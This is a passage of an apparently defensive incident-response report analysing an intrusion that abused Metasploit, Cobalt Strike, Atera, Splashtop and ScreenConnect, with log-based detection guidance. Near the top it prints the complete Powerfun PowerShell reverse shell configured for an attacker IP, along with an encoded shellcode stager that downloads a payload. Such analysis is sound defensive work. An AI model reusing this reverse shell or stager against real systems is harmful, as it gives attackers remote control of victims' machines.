<p>When decoded, the payload is a configured <a href="https://github.com/rapid7/metasploit-framework/blob/c0b995cc97f8392d1e174306890c5d515e158963/data/exploits/powershell/powerfun.ps1" target="_blank" rel="noreferrer noopener">Powerfun reverse-shell believed to be part of Metasploit</a> (due to its usage of the default port <i>4444</i>). This specific format of the PowerShell reverse shell was <a href="https://github.com/rapid7/metasploit-framework/commit/c0b995cc97f8392d1e174306890c5d515e158963" target="_blank" rel="noreferrer noopener">introduced in version v4.11.7</a> (May 19, 2015), suggesting the threat actor partially relies on outdated tooling. The script was later <a href="https://github.com/rapid7/metasploit-framework/commit/47eec52f064434732427991b3bd211fd3e2942c3" target="_blank" rel="noreferrer noopener">modified in v6.3.23</a> (Nov 30, 2021).</p>
<pre># Powerfun - Written by Ben Turner &amp; Dave Hardy

function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]4444
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("94.232.43.201",4444)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("94.232.43.201") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}

powerfun -Command reverse -Sslcon true
</pre>
<p>Once connected with <i>94.232.43[.]201:4444</i> over TCP, the threat actor leveraged the reverse shell to execute the two slightly different encoded PowerShell stagers. Based on the timestamps between process creations, as well as the presence of credible <i>WerFault.exe</i> process trees, we believe with medium confidence the first process crashed multiple times after eight minutes, forcing the threat actor to re-start the stager.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21558" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-014.png" alt width="2892" height="452" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-014.png 2892w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-014-300x47.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-014-1024x160.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-014-768x120.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-014-1536x240.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-014-2048x320.png 2048w" sizes="(max-width: 2892px) 100vw, 2892px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21559" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-015.png" alt width="1158" height="806" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-015.png 1158w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-015-300x209.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-015-1024x713.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-015-768x535.png 768w" sizes="(max-width: 1158px) 100vw, 1158px" /></a></p>
<p>While both of these commands vary in obfuscation, they ultimately execute the same following shellcode.</p>
<pre>/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmhe6CvJaAIAEVGJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAz/Tgh17GjwtaJW/9VqAGoEVldoAtnIX//VizZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuww==</pre>
<p>This shellcode acts as a stager that downloads a payload from a websocket established with <i>94.232.43[.]201:4433</i>. Analysis of similar shellcode as well as its API hashing algorithm (incl. rainbow table) has been <a href="https://blog.nviso.eu/2021/09/02/anatomy-and-disruption-of-metasploit-shellcode/" target="_blank" rel="noreferrer noopener">documented by NVISO</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21560" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-016.png" alt width="494" height="303" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-016.png 494w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-016-300x184.png 300w" sizes="(max-width: 494px) 100vw, 494px" /></a></p>
<p>There are several tools available to assist with analyzing shellcode, one of which is <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152" target="_blank" rel="noreferrer noopener">scdbg</a>. This tool has the ability to analyze code and provide useful information regarding its functionality. By using scdbg to analyze the shellcode, we can obtain the necessary remote server&#8217;s host and port.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-21692" src="https://thedfirreport.com/wp-content/uploads/2023/09/Screenshot_2023-09-26_133509.png" alt width="492" height="278" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/Screenshot_2023-09-26_133509.png 492w, https://thedfirreport.com/wp-content/uploads/2023/09/Screenshot_2023-09-26_133509-300x170.png 300w" sizes="(max-width: 492px) 100vw, 492px" /></p>
<p>As is the case for plain HTTP, plain websockets allow for network communications to be intercepted. To that extent, the websocket stager retrieves the payload&#8217;s size (<i>0x02b043</i> in little endian) followed by the payload itself.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21562" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-018.png" alt width="1342" height="983" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-018.png 1342w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-018-300x220.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-018-1024x750.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-018-768x563.png 768w" sizes="(max-width: 1342px) 100vw, 1342px" /></a></p>
<p>When extracted, the payload matches two YARA rules from Florian Roth detecting <a href="https://github.com/Neo23x0/signature-base/blob/3f16ebc7184dc014007a84508fbf14a213d49609/yara/gen_loaders.yar#L14-L40" target="_blank" rel="noreferrer noopener">reflective loaders</a> as well as <a href="https://github.com/Neo23x0/signature-base/blob/3f16ebc7184dc014007a84508fbf14a213d49609/yara/gen_metasploit_payloads.yar#L323-L344" target="_blank" rel="noreferrer noopener">in-memory Meterpreter</a>.</p>
<h2 class="wp-block-heading">Atera</h2>
<p>While the ScreenConnect RMM software was leveraged on the beachhead, other systems compromised through lateral movement saw the installation of the <a href="https://www.atera.com/" target="_blank" rel="noreferrer noopener">Atera</a> RMM utility.</p>
<p>Installation of Atera was initiated from a beacon using the <i>C:\Windows\System32\msiexec.exe /i &#8220;C:\programdata\setup.msi&#8221;</i> command. Analysis of the Atera installer revealed which attacker account was used, namely <i><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b4d1d0c1dfd5c0dddad3c7c0c6dbdad3f4c4dbd8dfc7d7dcdbdbd8c79ad1d0c19adbc6d3">[email&#160;protected]</a></i> (account ID <i>0013z00002rytAiAAI</i>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21563" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-019.png" alt width="1939" height="900" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-019.png 1939w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-019-300x139.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-019-1024x475.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-019-768x356.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-019-1536x713.png 1536w" sizes="(max-width: 1939px) 100vw, 1939px" /></a></p>
<p>Throughout this utility&#8217;s <a href="https://support.atera.com/hc/en-us/articles/215951557-Live-manage-Command-prompt" target="_blank" rel="noreferrer noopener">live command prompt feature</a>, the threat actor obtained numerous live command prompts. The creation of live command prompts can be observed through processes started by <i>%ProgramFiles%\ATERA Networks\AteraAgent\Packages\AgentPackageRunCommandInteractive\AgentPackageRunCommandInteractive.exe</i>. Throughout this intrusion, all interactive commands used the <i>cmd.exe</i> interpreter. Using the Security log&#8217;s process events (event <i>4688</i>), we can observe how the threat actor interactively performed additional execution, as well as exfiltration.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21629" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-064.png" alt width="2137" height="1353" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-064.png 2137w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-064-300x190.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-064-1024x648.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-064-768x486.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-064-1536x972.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-064-2048x1297.png 2048w" sizes="(max-width: 2137px) 100vw, 2137px" /></a></p>
<p>&nbsp;</p>
<h2 class="wp-block-heading">Splashtop</h2>
<p>While Atera provides management capabilities such as scripting, unattended remote access requires third-party integrations. Throughout this intrusion, the actors relied on the <a href="https://www.atera.com/features/remote-access-and-remote-support/" target="_blank" rel="noreferrer noopener">Atera-recommended</a> Splashtop integration.</p>
<p>Using both file and process creation logs (i.e. Sysmon&#8217;s event <i>11</i> and <i>1</i> ) we can observe how Atera&#8217;s <i>AgentPackageSTRemote.exe</i> initiated the deployment of Splashtop, enabling the actor to gain unattended remote interactive access.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21565" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-021.png" alt width="1107" height="98" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-021.png 1107w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-021-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-021-1024x91.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-021-768x68.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21566" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-022.png" alt width="1407" height="72" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-022.png 1407w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-022-300x15.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-022-1024x52.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-022-768x39.png 768w" sizes="(max-width: 1407px) 100vw, 1407px" /></a></p>
<p>Reviewing the logging for Splashtop in the Windows Event log channels <i>Splashtop-Splashtop Streamer-Status/Operational</i> revealed the RMM ID in use by the threat actor.</p>
<pre>RMM_ID: hZCDFPhK75mJ</pre>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21567" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-023.png" alt width="871" height="431" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-023.png 871w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-023-300x148.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-023-768x380.png 768w" sizes="(max-width: 871px) 100vw, 871px" /></a></p>
<h3 class="wp-block-heading">Impacket</h3>
<p>As part of their toolkit, the threat actor used Impacket&#8217;s wmiexec.py script to perform their actions. This can be easily seen as wmiexec.py will, by default, redirect its output to <i>\\127.0.0.1\ADMIN$\__%timestamp%</i> (as visible in the <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py#L295" target="_blank" rel="noreferrer noopener">source code</a>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21568" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-024.png" alt width="467" height="457" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-024.png 467w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-024-300x294.png 300w" sizes="(max-width: 467px) 100vw, 467px" /></a></p>
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<h3 class="wp-block-heading">ScreenConnect</h3>
<p>As part of the installation process, ScreenConnect persists through an auto-start service. The built-in System event <i>7045</i> (A service was installed in the system) provides visibility into such installations.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21569" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-025.png" alt width="559" height="380" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-025.png 559w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-025-300x204.png 300w" sizes="(max-width: 559px) 100vw, 559px" /></a></p>
<p>Should the System events be unavailable, Sysmon registry value-set events (event <i>13</i>) provide sufficient visibility. As shown below, we can deduce the service&#8217;s start mode through the values:</p>
<ul class="wp-block-list">
<li><i>Type</i> of data <i>0x10</i> (<i>SERVICE_WIN32_OWN_PROCESS</i>)</li>
<li><i>Start</i> of data <i>0x2</i> (<i>SERVICE_AUTO_START</i>)</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21571" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-026.png" alt width="1567" height="333" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-026.png 1567w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-026-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-026-1024x218.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-026-768x163.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-026-1536x326.png 1536w" sizes="(max-width: 1567px) 100vw, 1567px" /></a></p>
<p>Although the Sysmon data of the <i>ImagePath</i> value had been corrupted through log collection, the persisted service command line could be recovered by running <a href="https://ericzimmerman.github.io" target="_blank" rel="noreferrer noopener">Eric Zimmerman&#8217;s Registry Explorer</a> against the acquired System hive (<i>C:\Windows\System32\config\SYSTEM</i>) and associated transaction log (<i>C:\Windows\System32\config\SYSTEM.LOG1</i>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21572" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-027.png" alt width="1586" height="856" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-027.png 1586w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-027-300x162.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-027-1024x553.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-027-768x415.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-027-1536x829.png 1536w" sizes="(max-width: 1586px) 100vw, 1586px" /></a></p>
<p>The recovered command line below defines the following options, as <a href="https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies">reported by</a> Anomali Threat Research.</p>
<ul class="wp-block-list">
<li><i>e</i> as session type, can be <i>Support</i>, <i>Meeting</i>, <i>Access</i> .</li>
<li><i>y</i> as process type, can be <i>Guest</i> or <i>Host</i> .</li>
<li><i>h</i> as the URI to the relay service&#8217;s URI.</li>
<li><i>p</i> as the relay service&#8217;s port.</li>
<li><i>s</i> as a globally unique identifier for client identification.</li>
<li><i>k</i> as the encoded encryption key, used for identity verification.</li>
<li><i>t</i> as the optional session name.</li>
</ul>
<pre><span class="ql-token hljs-string">"C:\Program Files (x86)\ScreenConnect Client (0e2f8d025e383f56)\ScreenConnect.ClientService.exe"</span> <span class="ql-token hljs-string">"?e=Access&amp;y=Guest&amp;h=instance-l7l8l9-relay.screenconnect.com&amp;p=443&amp;s=f1dccbe5-0865-4f1c-a463-9e25663d18d1&amp;k=BgIAAACkAABSU0ExAAgAAAEAAQC9cxw5UA763FPcVEu4K7lTUZPe40uWy%2fdpeqfjnhw6qPCnMz1zFVt6J1HHp%2b9%2fhXseaHv7tHKfAevkRMosxtdVUlRlFjGO1E0lztj6BuXXY3hOn%2b9zOMiD85jSb5nrrk4O4IhgV9GNihZS3aAMUcTWlSUzCOGSECigjs5Sg8kxq5CHz1RuGp6Wbv7SO9LEriAGZj%2fYQU%2fq0X9%2bFDnKAKtBYkUdW3Muf9ewnItCRM9XErqohYafqh04mlqluyGqfx%2bAMezEuQDgFHQPIurisVhSinHWRCO4WDLKpaoeWneMJ3BMj6ReFvhaXVGW0u%2fPMkXzYLB2sMMBcibeuJV1yczL&amp;v=AQAAANCMnd8BFdERjHoAwE%2fCl%2bsBAAAAQvvF3IURJU6YGnF7BiJwogAAAAACAAAAAAAQZgAAAAEAACAAAACqA7fRdCVSQQS%2bln7kPcL3Yr8FtoKz3%2fyztuVPXWhifgAAAAAOgAAAAAIAACAAAADfm%2b0yGLK3YmRYzydHC3OvJWlNwe8O2kNKxHqVXATSaaAEAADExpelIJ42A%2bmy3CqMzSNMfDDHLKfeVHAXqYi92UDuffufwuxI6hMNFfCGXwR%2fndw4CeU0AaoR4STjLsx7DhTUDnuspGicxlqoRTM%2bUmC1VN8mbfLBHx7SKMzJYWAwMM%2bfIbevg%2bXdhUrQRKuFsOU6VsOi6a7HFsFjMrF0HXzSlPJZILQ5C0tmPB%2bowunqV2JP3PDhxqI%2fgR5AoubdVIC8ZpsckrDk0tm5ARaDYpTxYxQMJ5acToCrRodGjvgRzddPywGYYvnTFxyS%2bZOwxz3TicTva8Tkx8PaXNNyckViUb%2bk3s102XEbFtqiD9NtnMPYhzmAAdqL4UR6ELqJrYX7Y%2f87XVJmzFtDdyYIufC1S3w6lVHDOlGS%2bvxtANiaRGWY%2bdZGpj75%2f8YlPAcctJioE4LefyqZKRhDjWG4OwVmCfKUcmnoLzEwZXFiXMkm4nPe4lBWL7xdsX5h4lcBjNevPvwN0K4%2bsE%2fC9jUONr3r9JiZc6V7RJOwfACO9AukfBzQOyfsb6KD%2b6tWKc%2fQ5rAPr4MtKqgA17CmSIJIRnLA5HDBMrybFaLAs5EfnFHAbS2UJpHMiXNIwEEksFM65hIN4OKrHnIjadBT8OzL2XCk9bRwSNUfkV7IkKbnJA%2bFm3iIlibtMnx3UkcNWYFiBObGjWY1eGzcOusEsAt4oZUVeMxiLUrpYZrGOFtqp1Mm4z5JEst4Bx3sYuQxxKrjs9pF9C9kgpj3Hhresa7b64pIu7SWku14fXjA1VxyYUg52vYoXzxWvn99hsF47CXOkGnQUhPWZkUFA75OCKh0Qp1yoZTyW7HI1MqV4A7Sw%2ftiyK13vPiKhRAojufru7axnGsthZ3eG62TxSD6q3uoBmy6G9lDdCQvi946unMf70FDmfRye2p8%2f2cBmqWe%2fpdzXIWqy%2bRwclHOOf4d5i%2fAZYzN%2fuvKayxkYwOMYo2bI8YwwYgWsRSQUmtsD1Q9%2bYG%2bpZtGvTkpdmsNzIzWNxg7LZUr3l2JqFdwlYgK3peySScsbRRxUuB6aIlxSoDvXo5KtDiKfxnkridOz4iz5T5yk7QJfSEEMnvmep0T4a75KvgZeMWd%2fUj4SKbG3v%2bDA2ZxVSFbktcAur8rkpDwqLwTUjYnvqJG%2bl%2blEgGHRsi5GxxlnM9k6IkCMACku40jzCYSvHOhFtimnMTmf2XOwavP32025803AMFp%2b5vrZ5rASeRNbos1EJi6LD8kdsJUkyShEKByaULaDhAFw3RglgiBxCCbGQPJHkd4ctpUeQmDPvu6IuMtw3mvNU%2fPKtzKcF6%2bqDjCkoF%2fWCHykMjSr37d%2fGrYEIB8ddw173TWYsG9Ei0%2boHEWjEvoAbtUcIxSN%2f4KZ0zUFdC79EOUQcnO1FiHZZHJJhUvLqD7ooZMp2S1%2f%2bpFFMmJC5hAZ3HBQHJjxLV6LWOYfkrDYsgf8D%2bWObpD9JPsgC5G%2fnmG8d9ArdlHBsOM2WobtioC4kdINw2JM6uqMvRAoCqkxrDmwQBkdbkIYLQOcAxhp7%2bj0KOnJ81ieO6Q4BmEUVcZpmmKKc8gV54eNKKr6EU%2fWgvqcmiCwv38i0h5J0AAAADebuB1klSTYkUNnr4J2kDkx0KsClquUNNxOifeVYIq4dqVz4jQZETw5fHbwxKP4Yxv4XZ2yxLM%2f%2b5iIuUFwyWT&amp;t=&amp;c=&amp;c=&amp;c=&amp;c=&amp;c=&amp;c=&amp;c=&amp;c="</span></pre>
<h2 class="wp-block-heading">Atera</h2>
<p>Similar to ScreenConnect&#8217;s persistence, Atera was persisted as an auto-started own-process service. This also could be observed using the System event <i>7045</i>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21573" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-028.png" alt width="1117" height="131" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-028.png 1117w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-028-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-028-1024x120.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-028-768x90.png 768w" sizes="(max-width: 1117px) 100vw, 1117px" /></a></p>
<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<h3 class="wp-block-heading">ScreenConnect, Atera</h3>
<p>Being installed as a service, ScreenConnect and Atera benefit from System-level permissions. Relying on services to obtain System-level permissions is an often-employed technique part of both legitimate tools (e.g., <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec#using-psexec" target="_blank" rel="noreferrer noopener">PsExec&#8217;s </a><i><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec#using-psexec" target="_blank" rel="noreferrer noopener">-s</a></i>) and malicious ones (e.g., <a href="https://docs.rapid7.com/metasploit/meterpreter-getsystem/" target="_blank" rel="noreferrer noopener">Metasploit&#8217;s </a><i><a href="https://docs.rapid7.com/metasploit/meterpreter-getsystem/" target="_blank" rel="noreferrer noopener">getsystem</a></i>).</p>
<p>Identifying service executions can be performed through both Sysmon&#8217;s event <i>1</i> as well as the built-in Security event <i>4688</i> where the parent process is <i>C:\Windows\System32\services.exe</i>. As can be seen in the following capture, these service executions run as local <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids" target="_blank" rel="noreferrer noopener">SYSTEM</a> (SID <i>S-1-5-18</i>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21574" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-029.png" alt width="2889" height="393" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-029.png 2889w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-029-300x41.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-029-1024x139.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-029-768x104.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-029-1536x209.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-029-2048x279.png 2048w" sizes="(max-width: 2889px) 100vw, 2889px" /></a></p>
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<h3 class="wp-block-heading">Process Injection</h3>
<p>As observed in nearly all intrusions, process injection was leveraged to masquerade the real origin of malicious actions. Depending on the employed techniques, multiple artifact combinations are available in the logs such as Sysmon&#8217;s:</p>
<ul class="wp-block-list">
<li>event <i>10</i> (process accessed), common for injecting into existing processes.</li>
<li>event <i>8</i> (remote thread created).</li>
<li>event <i>1</i> (process created), or alternatively Security event <i>4688</i>, to identify improbable processes such as the often abused default <i>rundll32.exe</i>.</li>
</ul>
<p>As widely documented in our &#8220;<a href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/" target="_blank" rel="noreferrer noopener">Cobalt Strike, a Defender&#8217;s Guide</a>&#8221; series, evidence of process injection can be supported by the later creation of post-exploitation (<i>\postex_*</i>) named-pipes (Sysmon event <i>17</i> and <i>18</i>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21575" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-030.png" alt width="897" height="167" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-030.png 897w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-030-300x56.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-030-768x143.png 768w" sizes="(max-width: 897px) 100vw, 897px" /></a></p>
<p>In-memory, YARA scans conducted during the intrusion using the win_cobalt_strike_auto rule from <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike" target="_blank" rel="noreferrer noopener">Malpedia</a> showed some of the various injections performed.</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Host</td>
<td>Pid</td>
<td>Process</td>
<td>Commandline</td>
<td>Rule</td>
</tr>
<tr>
<td>SERVER</td>
<td>1808</td>
<td>svchost.exe</td>
<td>C:\Windows\system32\svchost.exe -k netsvcs</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>DOMAINCONTROLLER</td>
<td>656</td>
<td>lsass.exe</td>
<td>C:\Windows\system32\lsass.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>FILE SHARE</td>
<td>572</td>
<td>winlogon.exe</td>
<td>winlogon.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>FILE SHARE</td>
<td>2052</td>
<td>spoolsv.exe</td>
<td>C:\Windows\System32\spoolsv.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>FILE SHARE</td>
<td>2184</td>
<td>svchost.exe</td>
<td>C:\Windows\system32\svchost.exe -k ftpsvc</td>
<td>win_cobalt_strike_auto</td>
</tr>
</tbody>
</table>
</figure>
<h3 class="wp-block-heading">Artifact Removal</h3>
<p>Throughout the intrusion, the threat actor covered their traces by deleting useful artifacts. As outlined by Sysmon&#8217;s event <i>23</i> (file delete), some actions were as expected, taken automatically by both stagers and RMM utilities.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21576" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-031.png" alt width="919" height="138" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-031.png 919w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-031-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-031-768x115.png 768w" sizes="(max-width: 919px) 100vw, 919px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21580" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-062.png" alt width="1439" height="225" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-062.png 1439w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-062-300x47.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-062-1024x160.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-062-768x120.png 768w" sizes="(max-width: 1439px) 100vw, 1439px" /></a></p>
